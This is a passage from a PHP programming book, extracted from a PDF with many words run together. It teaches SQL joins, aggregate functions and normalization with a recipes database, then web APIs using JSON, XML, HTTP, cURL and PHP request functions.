This relationship isperhaps clearer ifweillustrate thecontents ofthetables with
some sample data inTable 2.3,Table 2.4,andTable 2.5.
Table 2.3. Our recipes  Table
Description Name ID
Traditional dessert with crunchy crumble layer ed over sweet
fruit and bakedApple Crumble 1
Combination of in-season fruits, cover ed with fruit juice and
served chilledFruit Salad 2PHP Master: W rite Cutting-edge Code 64
www.it-ebooks.info
Table 2.4. Our ingredients  Table
Item ID
apple 1
banana 2
kiwifruit 3
strawberries 4
flour 5
fruit juice 6
butter 7
sugar 8
Table 2.5. Our recipe_ingredients  table
Ingredient_id Recipe_id
1 1
7 1
8 1
5 1
6 2
2 2
1 2
3 2
4 2
These tables arehardly readable, butthey represent thecorrect way ofshowing this
data. Assoon aswejointhetables together ,we’ll easily beable togain aperspective
ofthewhole picture.
Inner Joins
Tojoinover alinking table, we’ll need tostart attherecipes table, make ajointo
therecipe_ingredients table, andthen link from there totheingredients table. Here’ s
theSQL we’ll usetodothis:65 Databases
www.it-ebooks.info
SELECT recipes.name, ingredients.item
FROM recipes
INNER JOIN recipe_ingredients 
  ON recipes.id = recipe_ingredients.recipe_id
INNER JOIN ingredients 
  ON recipe_ingredients.ingredient_id = ingredients.id;
This SQL only selects thetwocolumns weaskfor,soweneed never beconcerned
about thenumeric identifiers thatareused inside thedatabase tomake therelation-
ships work correctly .This query willoutput thefollowing data setseen inTable 2.6.
Table 2.6. Data output fr om a JOIN statement
Item Name
apple Apple Crumble
flour Apple Crumble
butter Apple Crumble
sugar Apple Crumble
fruit juice Fruit Salad
banana Fruit Salad
apple Fruit Salad
kiwifruit Fruit Salad
strawberries Fruit Salad
This isanexample ofaninner join,which means weonly seedata where there are
matching rows inallthetables inthequery .Wehave other entries intherecipes
table, butsince we’re yettolink anyingredients tothem, they don’t appear here.
Toseealltherecipes, with orwithout ingredients, we’ll useanouter join.
Join = Inner Join
You’ll sometimes seequeries thatjustusetheJOIN keyword onitsown; these
areimplicit inner joins. This example uses theINNER keyword tomake itclearer
what ishappening. We’llgoontolook atother jointypes shortly .PHP Master: W rite Cutting-edge Code 66
www.it-ebooks.info
Outer Joins
Now thatyouknow what aninner joinis,youcanprobably guess what anouter
joinistoo.Theouter joinallows ustoretrieve alltherows from onetable, plus any
rows thatmatch from theother tables. Ifthere’ snomatching data, MySQL returns
NULL values forthose columns.
Since outer joins include rows from onetable andoptionally from another ,weneed
tospecify which table iswhich. Wedothisusing theRIGHT JOIN andLEFT JOIN
expressions. Weread lefttoright, sothelefttable istheonethat’sencountered first
intheSQL statement. Itoften helps tosketch thedatabase layout atthispoint, or
youcansimply refer back totheschema diagram.
Let’sseeanexample ofanouter join. Wewant toshow alltherecipes, notjustthose
with ingredients. Since therecipes table appears first, we’llLEFT JOIN toindicate
thatwewant alltherows inthelefttable:
SELECT recipes.name, ingredients.item
FROM recipes
LEFT JOIN recipe_ingredients 
  ON recipes.id = recipe_ingredients.recipe_id
LEFT JOIN ingredients 
  ON recipe_ingredients.ingredient_id = ingredients.id
Theonly difference intheSQL isthereplacement oftheINNER keyword withLEFT .
However ,ourresult sethaschanged, aswitnessed inTable 2.7.67 Databases
www.it-ebooks.info
Table 2.7. Data output fr om a LEFT JOIN  statement
Item Name
apple Apple Crumble
flour Apple Crumble
butter Apple Crumble
sugar Apple Crumble
fruit juice Fruit Salad
banana Fruit Salad
apple Fruit Salad
kiwi fruit Fruit Salad
strawberries Fruit Salad
Weekday Risotto
Bean Chili
Chicken Casser ole
Wecandraw asmany orasfewcolumns aswelikefrom anyofthetables weinclude
inourquery .When wehave columns with thesame name inmultiple tables, we
must prefix them with thename ofthetable they belong to,otherwise MySQL will
tellusitdoesn’t know which onewemean. It’sgood practice toqualify allcolumn
names, tomake itclear where thedata iscoming from. This also prevents you
having togoback andqualify them allwhen youwant toaddanother table toyour
query .
Aggregate Functions and Gr oup By
Anaggregate function gives ussome summary information about thedata that
matches ourquery .Wecanusethistechnique todoallsorts ofnice tricks. Theexact
functionality varies from platform toplatform, buthere aresome common examples
andtheir MySQL function names:
■counting records (COUNT )
■getting thelargest orsmallest value ofaparticular column (MAXorMIN)
■calculating thetotal ofaparticular column (SUM)
■calculating theaverage ofaparticular column (AVG)PHP Master: W rite Cutting-edge Code 68
www.it-ebooks.info
Forexample, ifwewanted tocount how many records there areinourquery ,we
could usetheCOUNT() function inMySQL, likethis:
SELECT recipes.name, ingredients.item, 
  COUNT( recipes.id ) AS total_recipes
FROM recipes
LEFT JOIN recipe_ingredients 
  ON recipes.id = recipe_ingredients.recipe_id
LEFT JOIN ingredients 
  ON recipe_ingredients.ingredient_id = ingredients.id
This produces theresult inTable 2.8.
Table 2.8. Data output fr om using the COUNT()  function
Total_r ecipes Item Name
12 apple Apple Crumble
Wasthatwhat youwere expecting? Theaggregate functions work onawhole result
set,unless weaskittodootherwise—so theCOUNT() statement hastaken all12
rows intheresults, andcounted them forus.
Sometimes, thatisn’t what wewant. MySQL canalsocount groups ofrows inadata
set,using theGROUP BY syntax. Forexample, wecaneasily adapt thisquery tocount
how many ingredients there are—per recipe—and show theingredient count rather
than arowforeach one. AllwedoisaddtheCOUNT() statement tothecolumn list
instead oftheingredient item, andtellMySQL togive usoneresult perrecipe by
grouping bytherecipes.id column:
SELECT recipes.name, 
  COUNT( ingredients.id ) AS ingredient_count
FROM recipes
LEFT JOIN recipe_ingredients 
  ON recipes.id = recipe_ingredients.recipe_id
LEFT JOIN ingredients 
  ON recipe_ingredients.ingredient_id = ingredients.id
GROUP BY recipes.id
Ahhh …that’sthesound ofasatisfied sigh aswearrive atourdesired data set,in
Table 2.9.69 Databases
www.it-ebooks.info
Table 2.9. The corr ect data set using COUNT()  and GROUP BY
Ingredient_count Name
4 Apple Crumble
5 Fruit Salad
0 Weekday Risotto
0 Bean Chili
0 Chicken Casser ole
Working with both joins andaggregate functions canbereally tricky ,buttake itone
step atatime andthese techniques will fallinto place. Itismuch easier tobuild
these things upinstages than towrite onemonster SQL statement andthen tryto
debug it!
Thefirst step istogetthedata from theonetable andfilter itasyouneed to.Join
tables, oneatatime, running thequery each time andchecking thatyour results
look asyouexpect them to.Once youseealltherows thatMySQL requires towork
outthedata youareasking for,youcanaddbells andwhistles—formatting columns,
calculating totals, andanything elseyouneed togenerate thecorrect data foryour
application. Using aggregate functions ismuch more efficient than looping inPHP
tocreate totals fordata setsorwork outaverages; database platforms arereally rather
good atworking with data, soitisbest todelegate these tasks totheexperts.
Normalizing Data
Thetopic ofdata normalization usually constitutes anentire chapter initself, but,
inanutshell, with thismethod weaimto:
■separate entities into their own table
■avoid multiple values inonecolumn
■record data inoneplace andlink toitfrom anyothers
Wecould improve ourdatabase design asitstands bymoving thedata inthechef
column intoaseparate table. Each chef would have aunique identifier ,which would
berecorded intherecipes table. Since achef isanentity ,itdeserves itsown
table—and here wecanrecord information about achef centrally andmaintain it,
rather than duplicating itinevery recipe row.PHP Master: W rite Cutting-edge Code 70
www.it-ebooks.info
It’seasy toimagine thatallowing users toenter their names will lead toquite alot
ofrecipes from “John,” aswell asafewfrom “john”—some ofwhom might bethe
same person! Toavoid this, wemove thechefs into their own table, which might
look likethis:
CREATE TABLE chefs(
  id INT AUTO_INCREMENT PRIMARY KEY ,
  name VARCHAR( 255 )
);
Simple enough, butthat’sallweneed aswework toavoid inconsistent data. We’ll
need torelate thechefs table totherecipes table, using anALTER TABLE statement
tosetthechef_id :
ALTER TABLE recipes CHANGE chef chef_id INT(255) NOT NULL;
Wecannow putdata into thechefs table, andupdate ourrecipes table tousetheid
ofthechefs contained within. Thelimited example shown here hasonly asingle
chef, butyour real-life recipe application would have many more. Figure 2.4shows
therelationships between ourtables atthispoint.
Figur e 2.4. Our database r elationships with the chefs  table added
Having separated thedata into thetable, we’ve given the“chef” entities their own
table andavoided duplicating values intherecipes table. This brings uscloser to71 Databases
www.it-ebooks.info
theideal ofnormalized form, keeping allourdata elegantly stored, andallowing
ustoretrieve itusing theJOIN techniques wesawearlier inthechapter .
Databases—sorted!
Inthischapter ,we’ve covered acomprehensive setofdatabase topics thatwill be
relevant toPHP developers everywhere. Understanding thePDOextension andtaking
advantage ofitinyour applications will give youconsistent, quality code.
Going beyond PHP,we’ve also investigated abunch ofdatabase techniques for
building SQL queries tojointables indifferent ways. Wehave also worked with
indexes, anddesigned database schemas thatwill survive thetestoftime and
scalability .PHP Master: W rite Cutting-edge Code 72
www.it-ebooks.info
Chapter3
APIs
Inthischapter ,we’ll becovering APIs—or rather ,thetransfer ofdata using ways
thataren’t web page-based—by looking atpractical examples ofhow topublish and
consume services, along with thetheory thatunderlies how itallworks. We’lltalk
about thesmall details, such asthedifferent service types anddata formats, aswell
asbig-picture concepts including how using APIs canaffect system architecture.
Befor e You Begin
Let’sstart outwith some definitions. APIstands forApplication Programming In-
terface, anditrefers totheinterface thataparticular service, application, ormodule
exposes forothers tointeract with. We’llalso refer toweb services inthischapter ,
which means we’re talking about anapplication serving data over HTTP (explained
inthesection called “HTTP: HyperT extTransfer Protocol” ).Forthepurposes of
thischapter ,thetwocanbeconsidered equivalent.
Tools for W orking with APIs
Themost important thing torealize before youstart towork with web services is
thatmost ofwhat youalready know about PHP applications iscompletely transfer -
www.it-ebooks.info
able! They work justlikenormal webapplications, butwith different output formats.
They’re alsoquite accessible when used asadata source foryour projects, andwe’ll
cover indetail how toconsume services.
Most oftheexamples inthischapter goback tofirstprinciples, showing how touse
native PHP functionality towork with services; however ,there aremany libraries
andframeworks thatcanstillhelp usinthese areas. Whether youusethesimple
versions, oryouhave alibrary youcanbuild on,thesame principles apply .
Adding APIs into Y our System
There areanumber ofreasons youmight want toinclude anAPIinyour system,
such asto:
■make data available toanother system ormodule
■supply data tothewebsite inanasynchronous manner
■form thebasis ofaservice-oriented architecture
Allthese reasons aregreat motivators foradding APIfunctionality ,andindeed the
majority ofmodern systems willneed anAPIofsome kind asweincreasingly collate
data from disparate systems. Thefirsttwobullet points areeasy toapproach forthe
average developer with web experience, butthenext section willlook more deeply
into thearchitectural possibilities ofdesigning asystem with anAPIasitsbasis.
Service-oriented Ar chitectur e
SOA (Service-oriented Architecture) isanapproach that’sincreasingly gaining in
popularity forPHP applications across avariety ofsectors. Theidea isthatthe
system isbased upon alayer ofservices thatprovide allthefunctionality thesystem
will need, buttheservices provide theapplication level andarenotlinked tothe
presentation layers. Inthisway,thesame modular ,reusable functionality canbe
used bymultiple systems.
Forexample, youmight write aservice layer ,andthen consume itwith awebsite
andacouple ofmobile device applications, while also allowing third parties toin-
tegrate against it.
Youcould endupwith asystem architecture thatlooks likeFigure 3.1.PHP Master: W rite Cutting-edge Code 74
www.it-ebooks.info
Figur e 3.1. A simple SOA ar chitectur e diagr am
This approach allows ustouse,test, andharden thecode intheapplication service
layer ,andthen easily useitelsewhere. When code ishardened, itmeans thatit’s
been inuseforsome time, andtherefore wecanbeconfident initsperformance
andstability .Having arobust service layer containing clean, modular application
logic thatwethen useasthebasis forourapplications isincreasingly seen asbest
practice.
Exactly how youstructure thisisupfordebate, andthere areagreat number of
perfectly good implementations ofthisapproach. Typically ,anMVC approach
would beused fortheservice layer ,which isthekind ofstyle we’ll useinthis
chapter when welook atsome examples. Each item onthetoplevel will bebuilt
differently ,butworking inthisway makes iteasy tobuild thevarious elements in-
dependently andondifferent platforms.
Perhaps oneofthebiggest advantages ofSOA istheway that, being very modular ,
itlends itself well tothelarge, complex systems weseebeing built inorganizations
today .Systems built thisway arealso easier toscale; youcanscale different parts
ofthesystem atdifferent rates, according totheload upon them. Aswemove our
platforms tothecloud, thiscanhelp usoutconsiderably ,later inthelifetime ofour
application.
We’llnow move onandlook atsome ofthetechnical details involved inworking
with web services.
Data Formats
Aweb service is,inmany ways, simply aweb page thatserves machine-readable
content rather than human-readable content. Rather than marking tagsupinHTML
forabrowser ,weinstead return thecontent in,forexample, JSON orXML (more
onthese shortly).75 APIs
www.it-ebooks.info
One ofthestrongest features ofarobust web service isthatitsdesign enables itto
return information inavariety offormats. So,ifaservice consumer prefers onedata
format over another ,itcaneasily request theformat thatwould bebest. This means
thatwhen wecreate services toexpose, we’ll tread carefully inmaking theway we
interpret requests andform responses independent from therestofourcode.
Thenext couple ofsections look atJSON andXML inmore detail, andgiveexamples
ofdata formatted thisway,aswell ashow wecanread andwrite them.
Working with JSON
JSON stands forJavaScript Object Notation. Itoriginated asawaytorepresent objects
inJavaScript, butmost modern programming languages willhave built-in function-
ality forworking with thisformat. It’satext-based way ofrepresenting arrays or
objects, similar toserialized PHP.
JSON isalightweight format; thesizeofthedata packet issmall anditissimple,
which makes itquick andeasy toprocess. Since itisdesigned forJavaScript, it’s
anexcellent choice forAPIs thatareconsumed byJavaScript; later inthischapter ,
you’ll seesome examples ofusing Ajax requests toinclude web service content in
your web page. JSON isalsoagood choice formobile device applications; itssmall
sizeandsimple format mean itisquick totransfer data, aswell asplacing minimal
strain ontheclient device todecode it.
InPHP,wewrite JSON with thejson_encode() function, andread itback with
json_decode() .Sounds simple? That’ sprobably because itis!Here’ sanexample
ofencoding anarray:
chapter_03/array .php
$concerts = array(
  array("title" => "The Magic Flute",
    "time" => 1329636600),
  array("title" => "Vivaldi Four Seasons",
    "time" => 1329291000),
  array("title" => "Mozart's Requiem",
    "time" =>  1330196400)
  );
echo json_encode($concerts);PHP Master: W rite Cutting-edge Code 76
www.it-ebooks.info
/* output
[{"title":"The Magic Flute","time":1329636600},{"title": ➥
  "Vivaldi Four Seasons","time":1329291000},{"title": ➥
  "Mozart's Requiem","time":1330196400}]
*/
This example hasahardcoded array with some example data added, butwe’d be
using thisinourAPItodeliver data from adatabase back end, forexample.
Takealook attheresulting output, shown atthebottom ofthescript. Thesquare
brackets indicate anenumerated array; ourexample data didn’t specify keys forthe
arrays used torepresent each concert. Incontrast, thecurly braces represent anobject
orassociative array ,which we’ve used inside each concert array .Since thenotation
isthesame foranobject andanassociative array ,wehave tostate which ofthose
we’d likewhen weread data from aJSON string, bypassing asecond parameter:
chapter_03/json.php
$jsonData = '[{"title":"The Magic Flute","time":1329636600}, ➥
  {"title":"Vivaldi Four Seasons","time":1329291000},{"title": ➥
  "Mozart\'s Requiem","time":1330196400}]';
$concerts = json_decode($jsonData, true);
print_r($concerts);
/*
Output:
Array                                                                                                                                                                                        
(
    [0] => Array
        (
            [title] => The Magic Flute
            [time] => 1329636600
        )
    [1] => Array
        (
            [title] => Vivaldi Four Seasons
            [time] => 1329291000
        )
    [2] => Array
        (77 APIs
www.it-ebooks.info
            [title] => Mozart's Requiem
            [time] => 1330196400
        )
)
*/
Inthisexample, we’ve simply taken thestring output byjson_encode() and
translated itback into aPHP array .Since wedowant anassociative array ,rather
than anobject, wepass true asthesecond parameter tojson_decode() .Without
this, we’d have anarray containing threestdClass objects, each with properties
calledtitle andtime .
Asisclear from these examples, JSON issimple towork with inPHP,andassuch
itisapopular choice forallkinds ofweb services.
Working with XML
Having seen theexample with JSON, let’slook atanother commonly used data
format, XML. XML stands foreXtensible Markup Language; it’sthestandard way
ofrepresenting machine-readable data onmany platforms.
XML isamore verbose format than JSON. Itcontains more data-type information
anddifferent systems will usedifferent tagsandattributes todescribe information
ingreat detail. XML canbeawkward forhumans toread, butit’sideal formachines
asitissuch aprescriptive format. Asaresult, it’sagood choice forusewhen integ-
rating twosystems exchanging important data unsupervised.
InPHP,there ismore than oneway ofworking with XML; themain players here
aretheDOM extension ortheSimpleXML extension. Their functionality overlaps
greatly; however ,inanutshell, DOM could bedescribed asmore powerful and
complex, while SimpleXML ismore, well, simple! Youcanswitch between formats
with asingle function call, soit’strivial tobegin with oneandfliptousing the
other foraparticular operation. Since we’re working with basic examples, thecode
shown here will usetheSimpleXML extension.
Let’sstart with anexample along thesame lines astheJSON oneabove:PHP Master: W rite Cutting-edge Code 78
www.it-ebooks.info
chapter_03/simple_xml.php
$simplexml = new SimpleXMLElement(
  '<?xml version="1.0"?><concerts />');
$concert1 = $simplexml->addChild('concert');
$concert1->addChild("title", "The Magic Flute");
$concert1->addChild("time", 1329636600);
$concert2 = $simplexml->addChild('concert');
$concert2->addChild("title", "Vivaldi Four Seasons");
$concert2->addChild("time", 1329291000);
$concert3 = $simplexml->addChild('concert');
$concert3->addChild("title", "Mozart's Requiem");
$concert3->addChild("time", 1330196400);
echo $simplexml->asXML();
/* output:
<concerts><concert><title>The Magic Flute</title><time>1329636600 ➥
  </time></concert><concert><title>Vivaldi Four Seasons</title> ➥
  <time>1329291000</time></concert><concert><title>Mozart's Requiem ➥
  </title><time>1330196400</time></concert></concerts>
*/
Let’sstart from thetopofthefileandwork through thiscode example. First ofall,
wecreate aSimpleXMLElement ,which expects awell-formed XML string topass to
theconstructor .This isgreat ifwewant toread andwork with some existing XML
(and willbereally handy when weparse incoming requests with XML data inthem),
butfeels alittle clunky when we’re creating theempty element.
Then wemove onandstart adding elements. InXML, wecan’t have enumerated
items; everything needs tobeinside anamed tag,soeach concert item isinside a
tagnamedconcert .When weaddachild, wecanalso assign ittoavariable, and
thisallows ustocontinue tooperate onit.Inthiscase, wewant toaddmore children
toit,sowecapture itin$concert1 ,andthen addthetitle andtime tagsaschil-
dren.
Werepeat fortheotherconcert s(you’d probably usealooping construct ondata
pulled from elsewhere inarealapplication), andthen output theXML using the79 APIs
www.it-ebooks.info
SimpleXMLElement::asXML() method. This method literally outputs theXML that
thisobject represents.
When wecome toread XML, thisisfairly trivial:
chapter_03/xml_load_string.php  (excerpt)
$xml = '<concerts><concert><title>The Magic Flute</title><time> ➥
  1329636600</time></concert><concert><title>Vivaldi Four Seasons ➥
  </title><time>1329291000</time></concert><concert><title> ➥
  Mozart\'s Requiem</title><time>1330196400</time></concert> ➥
  </concerts>';
$concert_list = simplexml_load_string($xml);
print_r($concert_list);
/* output:
SimpleXMLElement Object
(
    [concert] => Array
        (
            [0] => SimpleXMLElement Object
                (
                    [title] => The Magic Flute
                    [time] => 1329636600
                )
            [1] => SimpleXMLElement Object
                (
                    [title] => Vivaldi Four Seasons
                    [time] => 1329291000
                )
            [2] => SimpleXMLElement Object
                (
                    [title] => Mozart's Requiem
                    [time] => 1330196400
                )
        )
)
*/PHP Master: W rite Cutting-edge Code 80
www.it-ebooks.info
When wewant towork with XML, wecanload itintosimplexml_load_string()
(there isalsoasimplexml_load_file() function). When weinspect thisobject, we
canseethebasic outline ofourdata, butyoumay notice thatthere aremultiple
SimpleXMLElement objects showing here. SimpleXML gives ussome great features
foriterating over XML data, andforaccessing individual elements, solet’slook at
anexample—designed forbrowser output—which shows offsome ofthefunction-
ality:
chapter_03/xml_load_string.php  (excerpt)
$xml = '<concerts><concert><title>The Magic Flute</title><time> ➥
  1329636600</time></concert><concert><title>Vivaldi Four Seasons ➥
  </title><time>1329291000</time></concert><concert><title> ➥
  Mozart\'s Requiem</title><time>1330196400</time></concert> ➥
  </concerts>';
$concert_list = simplexml_load_string($xml);
// show a table of the concerts
echo "<table>\n";
foreach($concert_list as $concert) {
  echo "<tr>\n";
  echo "<td>" . $concert->title . "</td>\n";
  echo "<td>" . date('g:i, jS M',(string)$concert->time) . ➥
       "</td>\n";
  echo "</tr>\n";
}
echo "</table>\n";
// output the second concert title
echo "Featured Concert: " . $concert_list->concert[1]->title;
First, weload theXML intoSimpleXML sothatwecaneasily work with it.Wethen
loop through theitems inside it;wecanuseforeach forthistomake itquick and
easy toiterate over ourdata set.
Ifwewere toinspect each$concert value inside theloop withvar_dump() ,we’d
seethatthese areactuallySimpleXMLElement objects, rather than plain arrays. When
weecho$concert->title ,SimpleXML knows how torepresent itself asastring,
andsoitjustechoes thevalue oftheobject aswe’d expect. Dealing with thedate
formatting istrickier ,however! Thedate() function expects thesecond parameter81 APIs
www.it-ebooks.info
tobealong number ,andgives anerror message when youpass inaSimpleXMLEle-
ment object instead. Youmay have already noticed thatintheexample above, we
have typecast thetime property ofthe$concert object toastring. This isbecause
SimpleXMLElement knows how toturn itself intoastring, andifwesupply astring,
PHP will type juggle thattothecorrect data type fordate() .
SimpleXMLElement  Object T ypes
When youwork with SimpleXML, youcanquite often find thatthere areobjects
where youwere expecting values. Making useoftheapproach employed—to
typecast thevalues where needed—is anice way ofeasily working with those
values inafamiliar way.
Right attheendofthisexample, there’ salso a“featured concert,” which shows
how SimpleXML makes iteasy todrill down through theobject structure toreach
thevalues we’re interested in.Between thisfeature andthesimple iteration abilities
ofSimpleXML, youcanseeit’sagreat tooltohave inthetoolbox when working
with XML data andweb services.
HTTP: HyperT ext Transfer Pr otocol
HTTP isthewire thatweb requests andresponses aresent over—the underlying
data transfer format. Itincludes alotofmetadata about therequest orresponse, in
addition totheactual body ofthatrequest orresponse, andwe’ll betaking advantage
ofthataswework with web services. There areother protocols thatwe’ll look at,
such asXML-RPC andSOAP ,thatarebuilt onHTTP .We’llalsobemaking extensive
useofHTTP’ sfeatures when webuild RESTful services towards theendofthis
chapter .
When wedevelop simple web applications, it’spossible todosowithout paying
much attention toHTTP .Butifyouintend tolook atcaching, thedelivery ofdifferent
filetypes, and, inparticular ,how towork with other data formats aswewill with
web services, you’ll benefit greatly from agood grounding inHTTP .Itmight seem
more theoretical, butthissection provides realexamples andshows offthefeatures
thatwill help when developing anddebugging anything thatuses HTTP—so skip
ahead atyour peril.PHP Master: W rite Cutting-edge Code 82
www.it-ebooks.info
The HTTP Envelope
Have youever seen arawHTTP request andresponse? Let’sbegin bylooking atan
example ofeach, toseethecomponents oftheHTTP format. First, therequest:
 GET / HTTP/1.1
 User-Agent: curl/7.21.3 (i686-pc-linux-gnu) libcurl/7.21.3 ➥
   OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18
 Host: www.google.com
 Accept: */*
Walking through thisexample, wefirst ofallseethatthiswasaGETrequest tothe
root page (thesimple slash means thatthere wasnotrailing information), using
HTTP version 1.1.Thenext lineshows theUser-Agent header; thisexample came
from cURL (atoolfordata transfer thatwe’ll gointo further detail onshortly) on
anUbuntu laptop. TheHost header says which domain name thisrequest wasmade
toand, finally ,theAccept header indicates what kind ofcontent will beaccepted;
cURL claims tosupport every possible content type when itsays*/*.
Now ,how about theresponse?
 HTTP/1.1 302 Found
 Location: http://www.google.co.uk/
 Content-Type: text/html; charset=UTF-8
 Set-Cookie: PREF=ID=7930c24339a6c1b6:FF=0:TM=1311060710: ➥
   LM=1311060710:S=dNx03utga78C5kXJ; expires=Thu, 18-Jul-2013 ➥
   07:31:50 GMT; path=/; domain=.google.com
 Date: Tue, 17 Jan 2012 07:31:50 GMT
 Content-Length: 221
 
<HTML><HEAD><meta http-equiv="content-type" content="text/html; ➥
  charset=utf-8">
<TITLE>302 Moved</TITLE></HEAD><BODY>
<H1>302 Moved</H1>
The document has moved
<A HREF="http://www.google.co.uk/">here</A>.
</BODY></HTML>
Again, linebyline, wecanseethatwe’re using HTTP 1.1,andthatthestatus ofthis
response is302 Found .This isthestatus code, where 302means thatthecontent
iselsewhere (we’ll look inmore depth atstatus codes shortly). TheLocation isthe
URL thatwasrequested, andContent-Type tells uswhat format thebody ofthe83 APIs
www.it-ebooks.info
response isin—this pairs withContent-Length tohelp usunderstand what we’ll
find inthebody oftheresponse andhow tointerpret it.Theother headers shown
here aretheSet-Cookie header ,which sends thecookies tousewith later requests,
andtheDate theresponse wassent. Finally ,weseetheactual body content, which
istheHTML forthebrowser toshow inthiscase.
Asyoucansee,there’ squite abitof“invisible” content included intheHTTP
format, andwecanusethistoaddtotheclarity ofcommunication between client
andserver regarding theinformation we’re asking for,which formats weunderstand,
andsoon.When wework with webservices, we’ll beusing these headers toenhance
ourapplications foramore robust andpredictable experience allround.
We’llmove onnow tolook athow youcanmake anddebug HTTP requests, and
then seemore information about some oftheheaders wesawintheprevious ex-
amples.
Making HTTP Requests
Asissooften thecase, there aredifferent ways toachieve thesame goal. Inthis
section, we’ll look atmaking web requests from thecommand linewith cURL ,and
also from PHP using both thecurl extension andpecl_http .
cURL
Theprevious example shown isactually theoutput from aprogram called cURL,1
which isasimple command linetoolforrequesting URLs. Torequest aURL, you
simply type:
curl http://www.google.com/
There aresome command lineswitches thatareoften useful tocombine with cURL.
Table 3.1shows asmall selection ofthemost used.
1http://curl.haxx.se/PHP Master: W rite Cutting-edge Code 84
www.it-ebooks.info
Table 3.1. Common command line switches combined with cURL
Used for Switch
Displaying the verbose output seen in the r equest/r esponse example -v
Specifying which HTTP verb to use; e.g. GET, POST -X <value>
Showing header s only -l
Adding a data field to the r equest -d <key>=<value>
Many web services aresimply acase ofmaking requests with complex URLs ordata
inthebody .Here’ sanexample ofasking thebit.ly2URL shortener toshorten
http://sitepoint.com :
curl 'http://api.bitly.com/v3/shorten?
 login=user&apiKey=secret
 &longUrl=http%3A%2F%2Fsitepoint.com'                                                                                                                        
{ "status_code": 200, "status_txt": "OK", "data": { "long_url": ➥
   "http:\/\/sitepoint.com\/", "url": 
"http:\/\/bit.ly\/qmcGU2", "hash": "qmcGU2", "global_hash": ➥
   "3mWynL", "new_hash": 1 } }
Youcanseewesimply supply some access credentials andtheURL wewant to
shorten, andcURL does therestforus.We’lllook athow toissue thesame request
with avariety ofapproaches.
PHP cURL Extension
ThecURL extension inPHP ispart ofthecore language and, assuch, isavailable
onevery platform. This makes itasound choice foranapplication where having
fewer dependencies isagood trait. Thecode would look likethis:
chapter_03/curl.php
$ch = curl_init('http://api.bitly.com/v3/shorten'
  . '?login=user&apiKey=secret'
  . '&longUrl=http%3A%2F%2Fsitepoint.com');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
2http://bit.ly85 APIs
www.it-ebooks.info
print_r(json_decode($result));
/* output:
stdClass Object
(
    [status_code] => 200
    [status_txt] => OK
    [data] => stdClass Object
        (
            [long_url] => http://sitepoint.com/
            [url] => http://bit.ly/qmcGU2
            [hash] => qmcGU2
            [global_hash] => 3mWynL
            [new_hash] => 0
        )
)
*/
Inthisexample, we’re using thesame URL again togetashort URL from bit.ly .We
initialize acURL handle usingcurl_init() ,then make acalltocurl_setopt() .
Without thisCURLOPT_RETURNTRANSFER setting,curl_exec() will output theresult
rather than returning it!Once thecURL handle iscorrectly prepared, wecall
curl_exec() ,which actually makes therequest. Westore thebody oftheresponse
in$result ,andsince it’sinJSON, thisscript decodes andthen outputs it.
Getting Headers with PHP cURL
This example showed how togetthebody oftheresponse, andoften that’sallwe
want. Ifyoualsoneed header information, however ,youcanusethecurl_info()
function, which returns myriad additional information.
PHP pecl_http Extension
This module iscurrently excluded bydefault inPHP,butcaneasily beinstalled
viaPECL (seeAppendix Aformore information). Itprovides amore modern and
approachable interface toworking with web requests. Ifyour application needs to
runonalotof“vanilla” PHP installations, thismight beapoor choice, butifyou’re
deploying toaplatform youcontrol, pecl_http comes highly recommended. Here’ s
anexample ofusing it:PHP Master: W rite Cutting-edge Code 86
www.it-ebooks.info
chapter_03/pecl_http.php
$request = new HttpRequest('http://api.bitly.com/v3/shorten'
  . '?login=user&apiKey=secret'
  . '&longUrl=http%3A%2F%2Fsitepoint.com');
$request->send();
$result = $request->getResponseBody();
print_r(json_decode($result));
/* output:
stdClass Object
(
    [status_code] => 200
    [status_txt] => OK
    [data] => stdClass Object
        (
            [long_url] => http://sitepoint.com/
            [url] => http://bit.ly/qmcGU2
            [hash] => qmcGU2
            [global_hash] => 3mWynL
            [new_hash] => 0
        )
)
*/
Thestructure ofcode forthissimple request looks very much liketheoneused for
thecURL extension; however ,asweaddmore complex options toit,such as
sending andreceiving data andheader information, thepecl_http extension ismore
intuitive andeasier touse. Itoffers both procedural andobject oriented interfaces,
soyoucanchoose whichever suits youoryour application best.
PHP Str eams
PHP hasnative handling forstreams; ifyouenableallow_url_fopen inyour php.ini
file,youcandothis:
$fp = fopen('http://example.com');
This islovely forfilehandling, butyoumight bewondering how it’suseful forAPIs.
It’sactually very useful; theexample we’ve seen above, using asimpleGETrequest,
caneasily beachieved usingfile_get_contents() ,likethis:87 APIs
www.it-ebooks.info
chapter_03/streams.php
$result = file_get_contents('http://api.bitly.com/v3/shorten'
  . '?login=user&apiKey=secret'
  . '&longUrl=http%3A%2F%2Fsitepoint.com');
print_r(json_decode($result));
/* output:
stdClass Object
(
    [status_code] => 200
    [status_txt] => OK
    [data] => stdClass Object
        (
            [long_url] => http://sitepoint.com/
            [url] => http://bit.ly/qmcGU2
            [hash] => qmcGU2
            [global_hash] => 3mWynL
            [new_hash] => 0
        )
)
*/
This isaneat way ofgrabbing abasic request; however ,thisapproach canbeexten-
ded—just likethecURL andpecl_http extensions—to handle headers andother
request methods. Totake advantage ofthis, usethe$context parameter ,which ac-
cepts avalid context. Create acontext using thecreate_stream_context() function;
thedocumentation isnice andclear ,3andshows how tosetthebody content,
headers, andmethod forthestream. This approach ispossibly lessintuitive, butit
hastheadvantage ofbeing available bydefault onmost platforms, soit’sabetter
choice where theapplication needs totolerate anumber ofplatforms.
HTTP Status Codes
One oftheheaders wesawreturned bycURL intheearlier examples wasthestatus
header ,which showed thevalue302 Found .Every HTTP response willhave astatus
code with it,andthecodes arethefirst impression wegetofwhether therequest
wassuccessful, ornot,orperhaps something inbetween. Thestatus codes arealways
3http://php.net/stream_context_createPHP Master: W rite Cutting-edge Code 88
www.it-ebooks.info
three digits, where each hundred represents adifferent general class ofresponse.
Table 3.2gives anoverview ofcommon status codes.
Table 3.2. Common HTTP status codes and categories
Information 1xx
Success 2xx
Everything is fine OK 200
A resour ce was cr eated Created 201
The r equest was pr ocessed, but nothing needs to be
returnedNo Content 204
Redir ect 3xx
Permanent r edirect; clients should update their links Moved 301
Usually the r esult of a r ewrite rule or similar , here is the
content you asked for , but it was found somewher e
differ entFound 302
This r elates to caching and is usually used with an empty
body to tell the client to use their cached ver sionNot Modified 304
This content has moved, but not for ever, so don’t update
your linksTempor ary Redir ect 307
Failur e 4xx
